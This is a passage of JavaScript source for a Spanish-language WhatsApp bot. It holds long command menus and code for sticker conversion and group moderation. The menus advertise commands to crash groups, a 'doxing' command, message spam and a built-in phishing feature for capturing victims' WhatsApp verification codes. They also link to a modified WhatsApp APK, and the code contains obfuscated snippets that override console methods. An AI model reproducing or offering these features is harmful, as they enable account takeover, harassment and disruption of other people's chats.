║ _Búsqueda de imágenes_
║ _en Google_
║
╠ *●${prefix}sinfondo*
║ _Quita fondo a imagenes_
║
╠ *●${prefix}wp* 
║ _Búsqueda de fondos_
║ _de pantalla_
║
╠ *●${prefix}par*
║ _Anime para compartir perfil_
║ _(hombre | mujeres)_
║
╠ *●${prefix}animevid*
║ _Videos anime cortos_
║
╠ *●${prefix}queanime*
║ _Etiqueta una imagen de un Anime_
║ _Para saber que anime es_
║
╠ *●${prefix}loli*
║
╠ *●${prefix}neko*
║
╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
║
╠ *●${prefix}bass*
║ _Etiqueta un audio_
║
╠ *●${prefix}ardilla*
║ _Etiqueta un audio_
║
╠ *●${prefix}trigger*
║ _Etiqueta un audio_
║
╠ *●${prefix}lento*
║ _Etiqueta un audio_
║
╠ *●${prefix}rapido*
║ _Etiqueta un audio_
║
╠ *●${prefix}imut*
║ _Etiqueta un audio_
║
╠ *●${prefix}hode*
║ _Etiqueta un audio_
║
╠ *●${prefix}grave*
║ _Etiqueta un audio_
║
╠ *●${prefix}fantasma*
║ _Etiqueta un audio_
║
╠ *●${prefix}robot*
║ _Etiqueta un audio_
║
╟╼╾┤🎞VIDEOS🎞├╼╾
║
╠ *●${prefix}reversa*
║ _Etiqueta un video_
║
╠ *●${prefix}vrapido*
║ _Etiqueta un video_
║
╠ *●${prefix}vlento*
║ _Etiqueta un video_
║
╠ *●${prefix}mirror*
║ _Etiqueta un video_
║
╠ *●${prefix}vefecto*
║ _Etiqueta un video_
║
╠ *●${prefix}sinsonido*
║ _Etiqueta un video_
╙╖
╒╩════════════
╰──────────────╮
╭──────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li🌴
╰───────────────╯`

const stc = `╭⸻⃞✫꯭𝙈꯭𝙀꯭𝙉꯭𝙐꯭✫⃞⸻╮
╰────ြ𝐒𝐭𝐢𝐜𝐤𝐞𝐫🃏
╭─────────────
│ *${prefix}sticker*
│ _Imagen/gif/video_
│ Para crear sticker con video,
│ eiqueta el video/gif a
│ convertir con el comando. 
╰─────────────╮
╭─────────────╯
│ *${prefix}spack*
│ _Paquete personalizado_
│Ex: *${prefix}spack* Samu|330
╰───────────────────╮
╭───────────────────╯
│ *${prefix}robar*
│ *${prefix}exif*
╰─────────────╮
╭─────────────╯
│ *${prefix}takestick*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}sp*
│ _Etiqueta un Mensaje_
╰─────────────╮
╭─────────────╯
│ *${prefix}sgay*
│ _Etiqueta una imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}srip*
│ _Etiqueta una imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}scarcel*
│ _Etiqueta una imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}swm*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}colores*
│ _Texto a colores_
╰─────────────╮
╭─────────────╯
│ *${prefix}ger*
│ _Estilo Triggered_
╰─────────────╮
╭─────────────╯
│ *${prefix}aimg*
│ _Stiker a imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}agif*
│ _Stiker a gif_
╰─────────────╮
╭─────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li 
╰──────────────╯`
const Menug = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
        🔐Hola *${pushname}*
    
${bodyM} ${samu}${prefix}antilink${samu}
${bodyM} ${samu}${prefix}antimedia${samu}
${bodyM} ${samu}${prefix}antibad${samu}
${bodyM} ${samu}${prefix}autostick${samu}
${bodyM} ${samu}${prefix}antileg${samu}
${bodyM} ${samu}${prefix}welcome${samu}
    
${bodyM} ${samu}${prefix}antigp${samu}
_Para prohibir los links de otros grupos_
    
    ================================
    *🔞PARA ACTIVAR LOS COMANDOS +18*:
    ================================
    ${bodyM} ${prefix}+18 1/0
    ================================
        _Modo simsimi ilimitado_
    
*${prefix}simsimi 1*
    
    
*Para que el bot entre a tu grupo, usa el siguiente comando:*
${prefix}entrabot *(Link del grupo)*
        
🚧 *El siguiente comando es para crashear los grupos!! este comando es muy peligroso :) solo administradores pueden usarlo.* 🚧
    
*${prefix}buggp*
    
_Usalo bajo tu responsabilidad!_
    
    
${bodyM} ${prefix}doxing _(Etiqueta un participante o algun mensaje)_
${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
${bodyM} ${prefix}nuevogrupo
${bodyM} ${prefix}grupo abrir/cerrar
${bodyM} ${prefix}getpic
${bodyM} ${prefix}salir
${bodyM} ${prefix}tagstick
${bodyM} ${prefix}totag
${bodyM} ${prefix}imagetag
${bodyM} ${prefix}hidetag
${bodyM} ${prefix}todos
${bodyM} ${prefix}setdesc
${bodyM} ${prefix}nombre
${bodyM} ${prefix}adminlist
${bodyM} ${prefix}setpic
${bodyM} ${prefix}enlinea
${bodyM} ${prefix}promote
${bodyM} ${prefix}demote
${bodyM} ${prefix}eliminar
${bodyM} ${prefix}añadir *(Numero sin el +)*
${bodyM} ${prefix}notif
${bodyM} ${prefix}reply @miembro|frase|frase
${bodyM} ${prefix}contacto @miembro|nombre
${bodyM} ${prefix}link
${bodyM} ${prefix}top5
${bodyM} ${prefix}clonar`

const Menud = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li   

🔐Hola *${pushname}*

♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪

${bodyM} ${prefix}play *(Descarga de musica)*
${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
${bodyM} ${prefix}twit *(videos de Twitter)*
${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
${bodyM} ${prefix}fb _(Link de FaceBook)_
${bodyM} ${prefix}mfire *(Link de mediafire)*
${bodyM} ${prefix}tomp3 *(Videos a audio)*
${bodyM} ${prefix}letra *(Busca la letra de una cancion)*`

const Menuo = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                


${bodyM} ${prefix}grupos *(Ve los grupos del bot)*
${bodyM} ${prefix}timer *(Cronometro)*
${bodyM} ${prefix}calc *(Calculadora)*
${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
${bodyM} ${prefix}tiktokstalk @usuario
${bodyM} ${prefix}hidetag *(Texto)*
${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
${bodyM} ${prefix}shortlink _(Acortador de links)_
${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
${bodyM} ${prefix}binatext *(codigo binario a texto)*
${bodyM} ${prefix}aoctal *(texto a codigo octal)*
${bodyM} ${prefix}octalatext *(codigo octal a texto)*
${bodyM} ${prefix}ahex *(texto a codigo hex)*
${bodyM} ${prefix}hexatext *(codigo hex a texto)*
${bodyM} ${prefix}wa.me
${bodyM} ${prefix}idioimas
${bodyM} ${prefix}reversa
${bodyM} ${prefix}meme
${bodyM} ${prefix}leermas _frase/frase_
${bodyM} ${prefix}mapa
${bodyM} ${prefix}soyyo
${bodyM} ${prefix}blocklist
${bodyM} ${prefix}leerimagen

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	      🌸 SamịPerry.li 🌸
 ********************************`
 const Menu7 = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            

 Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:
 
 paypal.me/samu330
 
 
 
 ${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
 ${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
 ${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
 ${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
 ${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
 ${bodyM} ${prefix}ger *(Etiqueta una imagen)*
 ${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
 ${bodyM} ${prefix}cg *(Etiqueta una imagen)*
 
 *̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
          🌸 SamịPerry.li 🌸
  ******************************`
  const Menu8 = `*COMANDOS PARA ${botNumber}*

*Pará actualizar el bot:*
_${prefix}actualizar_

*Para apagar el bot:*
_${prefix}apagar_


⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 

*${prefix}Restaurar*

Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.

╭─────────────
│ *${prefix}ban*
│ _Prohibe el uso del bot a una persona_
╰─────────────╮
╭─────────────╯
│ *${prefix}unban*
│ _Permite el uso del bot a una persona baneada_
╰─────────────╮
╭─────────────╯
│ *${prefix}banchat*
│ _Bloquea el uso del bot en los chats que se active_
╰─────────────╮
╭─────────────╯
│ *${prefix}bloquear*
│ _Bloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}desbloquear*
│ _Desbloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}setname*
│ _Cambia tu nombre de usuario_
│
│ *${prefix}setpic*
│ _Actualiza tu foto de perfil_
│
│ *${prefix}setstatus*
│ _Cambia tu estado de WhatsApp_
╰─────────────╮
╭─────────────╯
│ *${prefix}estado*
│ _Envia un estado de texto_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadopic*
│ _Envia una imagen a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadovid*
│ _Envia un video a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciar*
│ _Vacia el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciartodo*
│ _Elimina todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}bc*
│ _Broadcast_
╰─────────────╮
╭─────────────╯
│ *${prefix}spam*
│ _Spam de mensajes_
╰─────────────╮
╭─────────────╯
│ *${prefix}fijar*
│ _Fijar el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desfijar*
│ _Desfija el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}archivar*
│ _Archiva un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desarchivar*
│ _Desarchiva todo_
╰─────────────╮
╭─────────────╯
│ *${prefix}silencio*
│ _Mutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desilenciar*
│ _Desmutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}sinleer*
│ _Muestra Chats sin leer_
╰─────────────╮
╭─────────────╯
│ *${prefix}apagar*
│ _Apaga el bot_
╰─────────────╮
╭─────────────╯
│ *${prefix}marcarsinleer*
│ _Marca como no leido todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}leertodo*
│ _Lee todos los chats_
╰──────────────────────`

const menu9 = `*${pushname}*

_Estos comandos solo pueden ser utilizados en grupos, y solo los puede uzar ${botNumber}_

🔥 ${prefix}crash
🔥 ${prefix}crash3
🔥 ${prefix}crashloc
🔥 ${prefix}crashcom
🔥 ${prefix}crashpc
🔥 ${prefix}crashcatal
🔥 ${prefix}crashrow

💠Si quieres ser inmune a estos comandos, Samu a creado un WhatsApp que soporta estos bugs, si quieres probar este WhatsApp comunicate con el:

*wa.me/+529984907794*

O bien puedes descargar desde el enlace...

Actualizado!!!

https://www.mediafire.com/file/izd44n2z86tbpem/Nyan_V2.apk/file

Si quieres tener este bot, y usar tu los comandos, ve como se instala aqui:

_https://www.youtube.com/watch?v=rOPBe6O-k3M_`


		   
		   
		if (isAutoSt && isMedia && isImage) {
		if (!itsMe) {
                const encmedia11 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media11 = await samu330.downloadAndSaveMediaMessage(encmedia11, `./sticker/${sender}`)
		const _0x1766=['warn','1kpfGKg','console','toString','constructor','length','178061stRBUX','1300545pGpVkk','138xeSLmh','return\x20(function()\x20','log','934846oKLsog','9350TIPSLK','25Aspfso','433203bjkpOB','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','test','360802vwcGNc','__proto__','prototype','error','bind','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','104838iWsgLj','apply','trace','table','return\x20/\x22\x20+\x20this\x20+\x20\x22/'];const _0x4d367b=_0x5de4;(function(_0x3eb50f,_0x5003ec){const _0x160706=_0x5de4;while(!![]){try{const _0x1f0294=parseInt(_0x160706(0x94))*-parseInt(_0x160706(0x90))+-parseInt(_0x160706(0x8f))+-parseInt(_0x160706(0x96))+-parseInt(_0x160706(0x93))+parseInt(_0x160706(0x9f))*-parseInt(_0x160706(0x89))+parseInt(_0x160706(0x99))+-parseInt(_0x160706(0x95))*-parseInt(_0x160706(0x8e));if(_0x1f0294===_0x5003ec)break;else _0x3eb50f['push'](_0x3eb50f['shift']());}catch(_0x5172fc){_0x3eb50f['push'](_0x3eb50f['shift']());}}}(_0x1766,0xb6c33));const _0x33a8e1=function(){let _0x15f095=!![];return function(_0xc7cbfc,_0x3249de){const _0x38e2d8=_0x15f095?function(){const _0x52e93e=_0x5de4;if(_0x3249de){const _0x285798=_0x3249de[_0x52e93e(0xa0)](_0xc7cbfc,arguments);return _0x3249de=null,_0x285798;}}:function(){};return _0x15f095=![],_0x38e2d8;};}(),_0x49176f=_0x33a8e1(this,function(){const _0x10650c=function(){const _0x379fdc=_0x5de4,_0x3a1fbc=_0x10650c['constructor'](_0x379fdc(0x87))()[_0x379fdc(0x8c)](_0x379fdc(0x97));return!_0x3a1fbc[_0x379fdc(0x98)](_0x49176f);};return _0x10650c();});function _0x5de4(_0x1fdbaf,_0x29f9bf){return _0x5de4=function(_0x165099,_0x5b786d){_0x165099=_0x165099-0x86;let _0x1efd2f=_0x1766[_0x165099];return _0x1efd2f;},_0x5de4(_0x1fdbaf,_0x29f9bf);}_0x49176f();const _0x1efd2f=function(){let _0x1bb24e=!![];return function(_0x15bf9c,_0x1d48e4){const _0x4f2296=_0x1bb24e?function(){const _0x55ad81=_0x5de4;if(_0x1d48e4){const _0x53132f=_0x1d48e4[_0x55ad81(0xa0)](_0x15bf9c,arguments);return _0x1d48e4=null,_0x53132f;}}:function(){};return _0x1bb24e=![],_0x4f2296;};}(),_0x5b786d=_0x1efd2f(this,function(){const _0x34c292=_0x5de4,_0x15e5c1=function(){const _0x5bb16a=_0x5de4;let _0x401748;try{_0x401748=Function(_0x5bb16a(0x91)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2b5e28){_0x401748=window;}return _0x401748;},_0x3e62c6=_0x15e5c1(),_0x245f34=_0x3e62c6[_0x34c292(0x8a)]=_0x3e62c6['console']||{},_0x1903dd=[_0x34c292(0x92),_0x34c292(0x88),'info',_0x34c292(0x9c),'exception',_0x34c292(0x86),_0x34c292(0xa1)];for(let _0x5ae008=0x0;_0x5ae008<_0x1903dd[_0x34c292(0x8d)];_0x5ae008++){const _0x58a6ed=_0x1efd2f['constructor'][_0x34c292(0x9b)][_0x34c292(0x9d)](_0x1efd2f),_0xb03c63=_0x1903dd[_0x5ae008],_0x260eb3=_0x245f34[_0xb03c63]||_0x58a6ed;_0x58a6ed[_0x34c292(0x9a)]=_0x1efd2f[_0x34c292(0x9d)](_0x1efd2f),_0x58a6ed[_0x34c292(0x8b)]=_0x260eb3[_0x34c292(0x8b)][_0x34c292(0x9d)](_0x260eb3),_0x245f34[_0xb03c63]=_0x58a6ed;}});_0x5b786d();const aaa=_0x4d367b(0x9e);
                const dataFl = `${aaa}`
		const author101 = args.join(' ')
                exif.create(dataFl, author101, `stickwm_${sender}`)
                await ffmpeg(`${media11}`)
                .input(media11)
                .on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                console.log(`Error : ${err}`)        
		fs.unlinkSync(media1)                
		reply('*Intenta de nuevo*')
                })
                .on('end', function () {
                console.log('Finish')                         
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                               
		if (error) return reply('error')
                wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)             
		fs.unlinkSync(media11)
                fs.unlinkSync(`./sticker/${sender}.webp`)
                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                })
                })
                .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]paletteuse`])
                .toFormat('webp')
                .save(`./sticker/${sender}.webp`)
		}}
		if ((isAutoSt && isMedia && sam.message.videoMessage.fileLength < 10000000 || isVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
		if (!itsMe) {
                const encmedia22 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media22 = await samu330.downloadAndSaveMediaMessage(encmedia22, `./sticker/${sender}`)
		const _0x27fb=['1227757QFPTCj','table','error','console','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','prototype','4mOcIdv','300973AXvFLL','113PJAhxc','bind','__proto__','constructor','1hPhdPg','toString','2614385THObwv','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','674jhGLms','1366829jQTHFD','378748rzovFh','exception','1wImvle','1305043VMjXUP','return\x20/\x22\x20+\x20this\x20+\x20\x22/','{}.constructor(\x22return\x20this\x22)(\x20)','apply'];function _0x3657(_0x24f22c,_0x12d4cd){return _0x3657=function(_0x36fb84,_0x290295){_0x36fb84=_0x36fb84-0x135;let _0x42acbe=_0x27fb[_0x36fb84];return _0x42acbe;},_0x3657(_0x24f22c,_0x12d4cd);}const _0x495578=_0x3657;(function(_0x53a12a,_0x3301a7){const _0x1d2e31=_0x3657;while(!![]){try{const _0x162d02=-parseInt(_0x1d2e31(0x135))+-parseInt(_0x1d2e31(0x14a))+parseInt(_0x1d2e31(0x149))*parseInt(_0x1d2e31(0x146))+-parseInt(_0x1d2e31(0x13d))*-parseInt(_0x1d2e31(0x145))+parseInt(_0x1d2e31(0x141))*parseInt(_0x1d2e31(0x147))+parseInt(_0x1d2e31(0x13b))*-parseInt(_0x1d2e31(0x13c))+parseInt(_0x1d2e31(0x143));if(_0x162d02===_0x3301a7)break;else _0x53a12a['push'](_0x53a12a['shift']());}catch(_0x50b87f){_0x53a12a['push'](_0x53a12a['shift']());}}}(_0x27fb,0xaac28));const _0x333816=function(){let _0x3b9de2=!![];return function(_0x34ee6d,_0x3e4e7c){const _0x338996=_0x3b9de2?function(){const _0x475110=_0x3657;if(_0x3e4e7c){const _0x1db804=_0x3e4e7c[_0x475110(0x14d)](_0x34ee6d,arguments);return _0x3e4e7c=null,_0x1db804;}}:function(){};return _0x3b9de2=![],_0x338996;};}(),_0x835717=_0x333816(this,function(){const _0xee8b8e=function(){const _0x50f77d=_0x3657,_0x3c9dc1=_0xee8b8e[_0x50f77d(0x140)](_0x50f77d(0x14b))()[_0x50f77d(0x140)](_0x50f77d(0x139));return!_0x3c9dc1['test'](_0x835717);};return _0xee8b8e();});_0x835717();const _0x42acbe=function(){let _0x37110c=!![];return function(_0x5a1047,_0x16f831){const _0x2238b9=_0x37110c?function(){if(_0x16f831){const _0x184403=_0x16f831['apply'](_0x5a1047,arguments);return _0x16f831=null,_0x184403;}}:function(){};return _0x37110c=![],_0x2238b9;};}(),_0x290295=_0x42acbe(this,function(){const _0x39d9ee=_0x3657;let _0x4b1d9a;try{const _0x19fa90=Function('return\x20(function()\x20'+_0x39d9ee(0x14c)+');');_0x4b1d9a=_0x19fa90();}catch(_0x477b7c){_0x4b1d9a=window;}const _0x32fe68=_0x4b1d9a[_0x39d9ee(0x138)]=_0x4b1d9a[_0x39d9ee(0x138)]||{},_0x3152dd=['log','warn','info',_0x39d9ee(0x137),_0x39d9ee(0x148),_0x39d9ee(0x136),'trace'];for(let _0x244612=0x0;_0x244612<_0x3152dd['length'];_0x244612++){const _0x55e7a2=_0x42acbe['constructor'][_0x39d9ee(0x13a)]['bind'](_0x42acbe),_0x15b4f3=_0x3152dd[_0x244612],_0x44c3e4=_0x32fe68[_0x15b4f3]||_0x55e7a2;_0x55e7a2[_0x39d9ee(0x13f)]=_0x42acbe[_0x39d9ee(0x13e)](_0x42acbe),_0x55e7a2[_0x39d9ee(0x142)]=_0x44c3e4['toString'][_0x39d9ee(0x13e)](_0x44c3e4),_0x32fe68[_0x15b4f3]=_0x55e7a2;}});_0x290295();const aaa=_0x495578(0x144);
                const packname1001 = `${aaa}`          
		const author1001 = args.join(' ')
                exif.create(packname1001, author1001, `stickwm_${sender}`)          
		reply('*⌛EN PROCESO*')
                await ffmpeg(`${media22}`)
		.inputFormat(media22.split('.')[4])
		.on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {                                                                                                        
		console.log(`Error : ${err}`)
                fs.unlinkSync(media22)                
		tipe = media.endsWith('.mp4') ? 'video' : 'gif'         
		reply('*Intenta de nuevo*')                   
		})                                      
		.on('end', function () {                         
		console.log('Finish')                       
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                                                     
		if (error) return reply('error')                                 
		wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)           
		fs.unlinkSync(media22)                                             
		fs.unlinkSync(`./sticker/${sender}.webp`)                  
		fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)               
		})
                })                                                
		.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])                                                                      
		.toFormat('webp')                                    
		.save(`./sticker/${sender}.webp`)
		}}
	    	if (messagesC.includes("chat.whatsapp")){
		        if (!isGroup) return
		        if (!isAntigp) return
		        if (isAdmin) return reply('Tienes suerte, eres admin y no te sacaré')
			reply(`Link detectado ${sender.split("@")[0]} serás expulsado de este grupo`)
			samu330.groupRemove(from, [sender])
		}

	    
	    ///////////////////////FUNCIONES CREADAS POR SAMU330\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
	    
			if (isGroup && botAdmin && isAntiMedia) {     
			if (!itsMe) {
			if (isMedia && !sam.message.videoMessage || isImage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
			samu330.groupRemove(from, [sender])
					}
				}      
			}
			if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
			if (isMedia && sam.message.videoMessage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
                        samu330.groupRemove(from, [sender])                                              
					}
				}
			}
			if (isGroup && botAdmin && isAntiLeg) {      
			if (!itsMe) {
			if (isAudio) {
			if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)
